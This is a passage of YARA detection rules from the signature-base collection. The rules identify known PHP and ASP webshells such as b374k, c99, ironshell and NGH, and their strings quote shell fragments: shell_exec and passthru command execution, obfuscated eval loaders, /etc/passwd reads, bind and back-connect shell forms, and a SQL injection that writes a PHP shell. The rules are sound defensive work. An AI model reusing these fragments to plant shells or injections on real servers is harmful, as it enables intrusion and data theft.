		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Dtool_Pro
{
	meta:
		description = "PHP Webshells Github Archive - file DTool Pro.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9f2922d1-b2af-58ae-b194-ecb33577effa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5623-L5641"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
		logic_hash = "da744efb521415fb8817c0982d8d538e1e38b1c0995f43716611df37bf371c38"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
		$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
		$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
		$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
		$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
		$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
		$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
		$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Ironshell_4
{
	meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "06e87e02-372b-5d4e-be52-5515a068665b"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_ironshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5642-L5661"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
		logic_hash = "1810071f261ad7390532b07ef24115726f236131aa8ffd29adbde9ebe5085e9d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Indexer_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "d6e17429-1b58-5a1b-846d-f5dbfd74cf3a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5662-L5678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
		logic_hash = "c576925c95b5bd2549e8039a1fc6ac228bfab5ddee8c4e12264ea78e9828ba5c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Toolaspshell
{
	meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "016af030-4991-583c-aab5-a2933ae0eeec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5679-L5692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
		logic_hash = "cb46d3170a9c144a22ef8c91b381495a471d2aa178a4a123eb9a1e32e1db7683"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Mini_Shell_Php_Php
{
	meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d5b0dfa5-46b5-5323-a8e8-b119d8c2c8e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5693-L5706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
		logic_hash = "553bd775d9662f9410d9ab946ccffe4b2ee92e367bcc6345fa595527653280cf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Sincap_1_0
{
	meta:
		description = "PHP Webshells Github Archive - file Sincap 1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "38d39739-660f-596d-a297-1f0dfe530797"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5707-L5722"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
		logic_hash = "0cb8851285bd55b0b613ec4c46ab88142e2cbba7e527ad510b008cfb342af221"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
		$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
		$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
		$s12 = "while (($ekinci=readdir ($sedat))){" fullword
		$s19 = "$deger2= \"$ich[$tampon4]\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Php
{
	meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "73eb7d8d-14bb-5bc2-90b2-90b6bd603bd1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5723-L5738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
		logic_hash = "f44ecdcf327cf417a90a91c8d23f6137b80c2006bea2ca2e214f2bfdf5793771"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend
{
	meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3e0bae7d-77a1-5439-bbe7-177bec23cea0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5739-L5756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
		logic_hash = "63ebb0c673a5aee05d2d9d571ebf63942d826b5148a5f7ed587ba1efbb0dc923"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell
{
	meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5775-L5793"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
		logic_hash = "2c39ffecb44ce2f936ba3563c6086d8b2ed75aec3b57b45e2a1f5e7321ac9a3f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Pws
{
	meta:
		description = "PHP Webshells Github Archive - file pws.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5794-L5810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
		logic_hash = "4b2eeb80200cc5dffa80cddc74f1902c0e8a5d2313d9a20d02eeb99ccb668ec0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if ($_POST['cmd']){" fullword
		$s7 = "$cmd = $_POST['cmd'];" fullword
		$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
		$s11 = "if (file_exists($uploaded)) {" fullword
		$s12 = "copy($uploaded, $dez);" fullword
		$s17 = "passthru($cmd);" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_Reader_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "80ec18e1-6f41-5188-b2d5-f4228c975fa1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5811-L5825"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
		logic_hash = "6ffda38584b6cdec818af8e09c62bb4a46f40230ffd5c1a68993a91c37f67680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_3
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "349cf6ac-92b3-59f7-a6e4-c23e69b454c6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5826-L5843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
		logic_hash = "6840af0d9f99277277edce93deb54e9a319c8938169701c89fdeb65207590951"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
		$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
		$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
		$s15 = "if(empty($_GET['file'])){" fullword
		$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_2
{
	meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b647f529-be81-51ad-b671-84aec410e133"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5844-L5860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
		logic_hash = "92bfac3516a448bbb3e78cf8950c6e816bf35d0ae2f3d32bc9b9b2836309999b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_PHP_Backdoor_2
{
	meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "65e1305b-4fc7-5885-b3df-92846bb57fe3"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_php_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5861-L5877"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
		logic_hash = "4228bcbfff5d7756615347196270f7916843e2aceacc7298610070b8b923381b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Worse_Linux_Shell_2
{
	meta:
		description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "04ed7464-29d1-54b9-98ff-afc03475b220"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Worse_Linux_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5878-L5895"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
		logic_hash = "6480c524213583511253ea1d37820994bba8a86f58a3775d4a9e4325725289d8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
		$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
		$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
		$s8 = "$currentCMD = \"ls -la\";" fullword
		$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
		$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Phpinj
{
	meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5896-L5913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
		logic_hash = "271efaa8f370376f971d3d59256658b341599ac554cc216e09401e44b16bdede"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_NGH
{
	meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5914-L5931"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
		logic_hash = "572b026545b012951136bdb9b1101e38f27bc3321b895799bc853ea1190877f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Matamu
{
	meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5932-L5948"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
		logic_hash = "c0101dab5fe7c3a2652b2e23e1ef0274364137895a402a0367c6b5474c0e8a1f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ru24_Post_Sh
{
	meta:
		description = "PHP Webshells Github Archive - file ru24_post_sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "86a45d72-c42d-58d5-9969-d3ebfc22853d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5949-L5964"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
		logic_hash = "6cf15a67c311979d32edfb443701cef34ee32d7a672314fc7b60b262b6b2c402"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "http://www.ru24-team.net" fullword
		$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s6 = "Ru24PostWebShell"
		$s7 = "Writed by DreAmeRz" fullword
		$s9 = "$function=passthru; // system, exec, cmd" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Hiddens_Shell_V1
{
	meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7194998e-c84c-5f59-92fe-857ecf7e8e88"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5965-L5976"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
		logic_hash = "b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Madnet
{
	meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f2b9c3d1-1c55-59cb-a9bf-8b4011f86a3b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5977-L5992"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
		logic_hash = "cd4048f28405f106302643656ae5f8a257aaec0184a8057a9dffbda9bb857027"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Locus7S
{
	meta:
		description = "PHP Webshells Github Archive - file c99_locus7s.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f92fe5a2-e465-56ed-a77b-b32ea4c2c105"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5993-L6008"
